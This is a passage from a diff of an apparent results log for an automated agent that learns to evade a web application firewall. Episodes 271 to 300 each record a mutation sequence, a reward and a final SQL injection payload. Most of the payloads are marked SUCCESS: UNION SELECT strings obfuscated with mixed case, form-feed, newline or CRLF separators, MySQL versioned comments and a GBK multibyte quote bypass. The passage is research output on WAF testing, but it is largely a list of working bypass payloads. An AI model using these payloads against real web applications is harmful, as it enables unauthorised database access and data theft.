-    "final_payload": "0'%0aUNIoN%0aSeLECT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNiOn%0cSEleCT%0c1,2,3;%00"
   },
   {
     "episode": 271,
@@ -5038,22 +5030,21 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNion%0aSElecT%0a1,2,3;%00"
+    "final_payload": "0'%0cunioN%0cSelEct%0c1,2,3;%00"
   },
   {
     "episode": 272,
-    "steps": 3,
-    "total_reward": 5.52,
+    "steps": 2,
+    "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "url_mid_char",
-      "crlf"
+      "formfeed"
     ],
-    "final_payload": "0'%0d%0aUNIoN%0d%0aseLEcT%0d%0a1,2,3;%00"
+    "final_payload": "0'%0cUniON%0cSelEct%0c1,2,3;%00"
   },
   {
     "episode": 273,
@@ -5063,47 +5054,33 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniOn%0aSeleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cunIoN%0cSeLEct%0c1,2,3;%00"
   },
   {
     "episode": 274,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "comment",
-      "ver_12345",
-      "comment",
-      "between_space",
-      "comment",
-      "plus_sep",
-      "comment",
-      "crlf",
-      "comment",
-      "crlf",
-      "comment",
-      "vtab",
-      "comment",
-      "tab_space",
-      "comment"
-    ],
-    "final_payload": "0'/**//*!12345UNION/**/SELECT*//**/1,2,3;%00"
-  },
-  {
-    "episode": 275,
-    "steps": 3,
-    "total_reward": 5.52,
+    "steps": 2,
+    "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "distinct",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNioN%0aDISTINCTROW%0aSEleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIOn%0cSEleCt%0c1,2,3;%00"
+  },
+  {
+    "episode": 275,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case",
+      "formfeed"
+    ],
+    "final_payload": "0'%0cUniON%0cSeleCT%0c1,2,3;%00"
   },
   {
     "episode": 276,
@@ -5113,9 +5090,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniON%0asEleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0csEleCt%0c1,2,3;%00"
   },
   {
     "episode": 277,
@@ -5124,10 +5101,10 @@
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
-      "tab_space",
-      "case"
+      "case",
+      "formfeed"
     ],
-    "final_payload": "0'%09uNIon%09seLEct%091,2,3;%00"
+    "final_payload": "0'%0cuNIoN%0cSeLeCT%0c1,2,3;%00"
   },
   {
     "episode": 278,
@@ -5137,9 +5114,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIOn%0aSElEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0cselEcT%0c1,2,3;%00"
   },
   {
     "episode": 279,
@@ -5149,9 +5126,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNion%0aSEleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0cseLeCt%0c1,2,3;%00"
   },
   {
     "episode": 280,
@@ -5161,9 +5138,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIoN%0aSELeCT%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0cSElECT%0c1,2,3;%00"
   },
   {
     "episode": 281,
@@ -5173,9 +5150,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIoN%0asEleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiON%0cSEleCT%0c1,2,3;%00"
   },
   {
     "episode": 282,
@@ -5185,9 +5162,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniON%0aselECT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiOn%0csELecT%0c1,2,3;%00"
   },
   {
     "episode": 283,
@@ -5197,9 +5174,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIon%0aSEleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNION%0csEleCT%0c1,2,3;%00"
   },
   {
     "episode": 284,
@@ -5209,34 +5186,21 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiON%0aSelECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNioN%0cSeLeCt%0c1,2,3;%00"
   },
   {
     "episode": 285,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "paren_full",
-      "comment",
-      "ver_urlenc",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline"
+      "case",
+      "formfeed"
     ],
-    "final_payload": "0'/**//*!50000%55NION*//**//*!50000%53ELECT*//**/1,2,3;%00"
+    "final_payload": "0'%0cuNIoN%0csEleCt%0c1,2,3;%00"
   },
   {
     "episode": 286,
@@ -5246,9 +5210,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0asElect%0a1,2,3;%00"
+    "final_payload": "0'%0cuNION%0cseLECt%0c1,2,3;%00"
   },
   {
     "episode": 287,
@@ -5257,23 +5221,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "between_space",
-      "between_space",
-      "plus_sep",
+      "ver_50000",
       "comment",
-      "plus_sep",
-      "newline",
-      "vtab",
-      "newline",
-      "formfeed",
-      "newline",
+      "comment",
       "crlf",
       "comment",
+      "tab_space",
+      "comment",
       "formfeed",
-      "hash_nl",
-      "comment"
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "newline",
+      "gbk_bypass",
+      "paren_full"
     ],
-    "final_payload": "0'%a0UNION%23xyz%0ASELECT%a01,2,3;%00"
+    "final_payload": "0%bf%27%0d%0a/*!50001UNION*/%0d%0a/*!50001SELECT*/%0d%0a1,2,3;%00"
   },
   {
     "episode": 288,
@@ -5283,9 +5247,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIon%0aSELecT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0csELeCT%0c1,2,3;%00"
   },
   {
     "episode": 289,
@@ -5295,9 +5259,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniON%0aselECT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0cseleCt%0c1,2,3;%00"
   },
   {
     "episode": 290,
@@ -5307,9 +5271,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIon%0aSeleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNION%0cSEleCt%0c1,2,3;%00"
   },
   {
     "episode": 291,
@@ -5319,9 +5283,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniON%0aseLeCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiOn%0cselEcT%0c1,2,3;%00"
   },
   {
     "episode": 292,
@@ -5331,9 +5295,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNioN%0asELEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNION%0csEleCt%0c1,2,3;%00"
   },
   {
     "episode": 293,
@@ -5343,9 +5307,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnioN%0asElecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniON%0cSelEct%0c1,2,3;%00"
   },
   {
     "episode": 294,
@@ -5355,9 +5319,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNiON%0aSElEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0cSelEct%0c1,2,3;%00"
   },
   {
     "episode": 295,
@@ -5367,9 +5331,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIoN%0aSEleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0cSeLeCt%0c1,2,3;%00"
   },
   {
     "episode": 296,
@@ -5379,9 +5343,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNioN%0aseLECT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNioN%0csELECT%0c1,2,3;%00"
   },
   {
     "episode": 297,
@@ -5391,9 +5355,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIOn%0asELEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0csElECt%0c1,2,3;%00"
   },
   {
     "episode": 298,
@@ -5403,9 +5367,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0aSELect%0a1,2,3;%00"
+    "final_payload": "0'%0cUNiOn%0cseLect%0c1,2,3;%00"
   },
   {
     "episode": 299,
@@ -5415,9 +5379,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0aseLEct%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0cselEct%0c1,2,3;%00"
   },
   {
     "episode": 300,
@@ -5427,8 +5391,8 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIOn%0aSElECT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnioN%0cselecT%0c1,2,3;%00"
   }
 ]
